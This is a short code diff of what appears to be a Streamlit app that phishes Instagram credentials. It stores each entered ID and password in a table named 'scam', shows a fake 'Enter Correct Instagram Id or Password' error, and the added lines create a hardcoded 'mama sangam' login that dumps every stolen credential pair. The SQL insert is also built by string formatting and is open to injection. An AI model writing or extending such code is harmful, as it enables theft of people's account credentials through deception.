@@ -15,3 +15,10 @@ if bt:
      cursor.execute(f"insert into scam values('{id_}','{password}');")
      con.commit()
      st.error("Enter Correct Instagram Id or Password")
+     if id_=="mama sangam" and password=="mama sangam":
+          data = cursor.execute("select * from scam")
+
+          st.header("id_:\password")
+          for row in data:
+               st.text(row)
+
